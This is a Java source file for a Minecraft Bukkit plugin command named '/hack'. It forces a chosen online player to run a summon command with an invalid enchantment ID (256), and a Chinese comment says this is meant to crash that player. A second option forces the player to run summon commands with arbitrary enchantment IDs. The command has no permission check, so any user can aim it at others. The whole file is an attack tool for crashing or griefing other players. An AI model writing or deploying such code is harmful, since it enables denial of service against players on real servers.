package org.ast.bedwarspro.command;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class HackCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
        if (strings.length < 2) {
            commandSender.sendMessage("§cUsage: /hack <superkick|summon> <player>");
            return true;
        }

        String feature = strings[0];
        String targetPlayerName = strings[1];
        Player targetPlayer = Bukkit.getPlayer(targetPlayerName);

        if (targetPlayer == null) {
            commandSender.sendMessage("§cPlayer " + targetPlayerName + " is not online or does not exist!");
            return true;
        }

        if (feature.equalsIgnoreCase("superkick")) {
            // 强制玩家执行导致崩溃的命令
            String crashCommand = "summon minecraft:zombie ~ ~ ~ {Enchantments:[{id:256,lvl:1}]}";
            targetPlayer.performCommand(crashCommand);
            commandSender.sendMessage("§aForced player " + targetPlayerName + " to execute a crash command.");
        } else if (feature.equalsIgnoreCase("summon")) {
            if (strings.length < 3) {
                commandSender.sendMessage("§cUsage: /hack summon <player> <enchantmentID>");
                return true;
            }

            try {
                int enchantmentID = Integer.parseInt(strings[2]);
                if (enchantmentID < 0 || enchantmentID > 255) {
                    commandSender.sendMessage("§cInvalid enchantment ID! It must be between 0 and 255.");
                    return true;
                }

                String summonCommand = "summon minecraft:zombie ~ ~ ~ {Enchantments:[{id:" + enchantmentID + ",lvl:1}]}";
                targetPlayer.performCommand(summonCommand);
                commandSender.sendMessage("§aForced player " + targetPlayerName + " to execute command: " + summonCommand);
            } catch (NumberFormatException e) {
                commandSender.sendMessage("§cEnchantment ID must be a valid number!");
            }
        } else {
            commandSender.sendMessage("§cUnknown feature: " + feature);
        }

        return true;
    }
}